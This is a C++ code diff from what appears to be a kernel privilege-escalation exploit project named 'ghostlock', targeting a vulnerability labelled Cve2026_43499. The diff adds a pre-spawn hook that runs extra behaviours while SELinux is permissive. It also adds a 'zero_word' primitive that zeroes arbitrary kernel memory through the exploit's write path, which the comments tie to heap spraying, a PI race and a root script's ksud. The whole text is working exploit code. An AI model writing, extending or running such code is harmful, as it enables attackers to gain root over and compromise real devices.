@@ -21,6 +21,7 @@
 #include "route/route_middleware.hpp"
 #include "route/route_policy.hpp"
 #include "session/handoff_probe.hpp"
+#include "session/ancillary/ancillary_controller.hpp"
 #include "session/victim_process.hpp"
 #include "support/decls.hpp"
 #include "support/fatal_error.hpp"
@@ -417,6 +418,24 @@ namespace ghostlock::session::backend {
                 support::run_state::complete("w1a");
                 support::run_state::complete("w1b");
             }
+            /* Ancillary behaviors run outside the exploit path. The call site is
+             * fixed: adding a behavior changes the registry, never this block.
+             * PreSpawn = SELinux is permissive and no victim exists yet, so one
+             * write covers everything the run brings up, the root script's ksud
+             * included. */
+            {
+                ancillary::AncillaryContext ancillary_context{
+                    .write_available = true,
+                    .read_available = false,
+                    .write_zero = &Cve2026_43499Policy::template zero_word<M>,
+                };
+                if (!ancillary::AncillaryController<M>::apply(
+                            ancillary::AncillaryStage::PreSpawn, session,
+                            ancillary_context)) {
+                    pr_warning("ancillary: pre-spawn behavior reported failure; "
+                               "continuing\n");
+                }
+            }
             return StageResult::Continue;
         }
     } // namespace
@@ -465,6 +484,13 @@ namespace ghostlock::session::backend {
 
     /* One route write: middleware resident fast path, else heap spray + PI race.
      * Shared statement order; the middleware policy decides the resident step. */
+    template <class M>
+    Status Cve2026_43499Policy::zero_word(uintptr_t target, const char *desc) {
+        const memory::WriteRequest request =
+                memory::WriteRequest::make(target, memory::WriteMode::Zero, 1);
+        return attack_write<M>(g_exploit_session, request, desc);
+    }
+
     template <class M>
     Status Cve2026_43499Policy::attack_write(ExploitSession &session,
                                              const memory::WriteRequest &request,
@@ -556,6 +582,12 @@ namespace ghostlock::session::backend {
         ExploitSession &, const memory::WriteRequest &, const char *);
     template Status Cve2026_43499Policy::attack_write<route::TcpPolicy>(
         ExploitSession &, const memory::WriteRequest &, const char *);
+    template Status Cve2026_43499Policy::zero_word<route::SelectPolicy>(uintptr_t,
+                                                                       const char *);
+    template Status Cve2026_43499Policy::zero_word<route::TcpPolicy>(uintptr_t, const char *);
+    template Status Cve2026_43499Policy::zero_word<route::MulticastPolicy>(uintptr_t,
+                                                                          const char *);
+
     template Status Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
         ExploitSession &, const memory::WriteRequest &, const char *);
 } // namespace ghostlock::session::backend
